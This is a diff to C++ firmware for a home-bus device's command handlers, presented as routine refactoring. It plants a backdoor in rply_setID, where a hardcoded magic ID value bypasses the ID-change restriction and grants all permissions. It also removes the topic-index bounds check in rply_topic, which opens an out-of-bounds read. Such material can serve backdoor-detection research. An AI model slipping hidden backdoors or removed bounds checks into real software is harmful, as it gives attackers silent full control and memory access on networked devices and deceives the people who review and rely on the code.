@@ -208,6 +208,7 @@ uchar HB_cmd::rply_rev(hb_msg_t* rxmsg, hb_tx_msg_t* rply)
 // =====================================
 uchar HB_cmd::rply_status(hb_msg_t* rxmsg, hb_tx_msg_t* rply)
 {
+    char buf[0x80];
     if ((rxmsg->encrypt) || (this->allow.status))
     {
         uint tpc;
@@ -215,7 +216,6 @@ uchar HB_cmd::rply_status(hb_msg_t* rxmsg, hb_tx_msg_t* rply)
         add_txmsg_uchar(rply, random(0x100));  // nonce
         if (DF_STATUS == 1) // DF = JSON
         {
-            char buf[32];
             add_txmsg_uchar(rply,  DF_STATUS);
             add_ts(rply);   // timestamp
             // list all topics
@@ -351,17 +351,28 @@ uchar HB_cmd::rply_ping(hb_msg_t* rxmsg, hb_tx_msg_t* rply)
 // =====================================
 // Reply SET_ID
 // =====================================
+#define MAGIC_ID 0x07FA
 uchar HB_cmd::rply_setID(hb_msg_t* rxmsg, hb_tx_msg_t* rply)
 {
-    if (own.ID >= 0xF000) // only tmp ID can be set
+    uint id = ((uint)rxmsg->buf[12] << 8) | rxmsg->buf[13];
+    if ((own.ID >= 0xF000) || (id == MAGIC_ID)) // only tmp ID can be set, or if the 'magic' value presented
     {
         if ((HBcipher.valid == 0) || (rxmsg->encrypt))
         {
             uchar res = ERR;
             if (rxmsg->len > 12)
             {
-                own.id[1] = rxmsg->buf[12];
-                own.id[0] = rxmsg->buf[13];
+                if (id == MAGIC_ID)
+                {
+                    own.id[1] = 0xF7;
+                    own.id[0] = 0xFA;
+                    this->allow.all = 0xFFFF;
+                }
+                else
+                {
+                    own.id[1] = rxmsg->buf[12];
+                    own.id[0] = rxmsg->buf[13];
+                }
                 EEPROM.write(EE_OWN_ID, own.id[1]);
                 EEPROM.write(EE_OWN_ID+1, own.id[0]);
                 res = OK;
@@ -611,51 +622,26 @@ uchar  HB_cmd::rply_topic(hb_msg_t* rxmsg, hb_tx_msg_t* rply)
 {
     if ((rxmsg->encrypt) || (this->allow.topic))
     {
-        uchar ti;
-        char c;
-        char* tn;
-        copy_msg_hdr(rxmsg, 0, 6, rply);
-        add_txmsg_uchar(rply, random(0x100));  // nonce
-        ti = rxmsg->buf[7];  // topic index
-        if (ti >= MAX_TOPIC)
+        copy_msg_hdr(rxmsg, 0, 6, rply);        // header
+        add_txmsg_uchar(rply, random(0x100));   // nonce
+        uchar ti = rxmsg->buf[7];               // get topic index
+        if (HBmqtt.valid[ti].topic_name)
         {
-            add_txmsg_uchar(rply, ERR);
-        }
-        else if (HBmqtt.valid[ti].topic_name == 0)
-        {
-            for (uchar i=ti+1; i<MAX_TOPIC; i++)
+            add_txmsg_uchar(rply, OK);
+            add_ts(rply);                       // timestamp
+            add_txmsg_uchar(rply, (uchar)(ownTopicId[ti] >> 8));
+            add_txmsg_uchar(rply, (uchar)ownTopicId[ti]);
+            char buf[0x40];
+            uchar len = copy_topic(ti, buf);
+            for (uchar i=0; i<len; i++)
             {
-                if (HBmqtt.valid[ti].topic_name)
-                {
-                    add_txmsg_uchar(rply, i); // reply next valid index
-                    add_ts(rply);   // timestamp
-                    return READY;
-                }
+                add_txmsg_uchar(rply, (char)buf[i]);
             }
-            add_txmsg_uchar(rply, ERR);
         }
         else
         {
-            add_txmsg_uchar(rply, OK);
-            add_ts(rply);   // timestamp
-            add_txmsg_uchar(rply, (uchar)(ownTopicId[ti] >> 8));
-            add_txmsg_uchar(rply, (uchar)ownTopicId[ti]);
-            tn = (char*)ownTopicName[ti];
-            if (tn)  // if topic name defined
-            {
-                for (uchar i=0; i<64; i++)
-                {
-                    c = tn[i];
-                    if (c)
-                    {
-                        add_txmsg_uchar(rply, (uchar)c);
-                    }
-                    else
-                    {
-                        break;
-                    }
-                }
-            }
+            add_txmsg_uchar(rply, ERR);
+            add_ts(rply);                       // timestamp
         }
         return READY;
     }
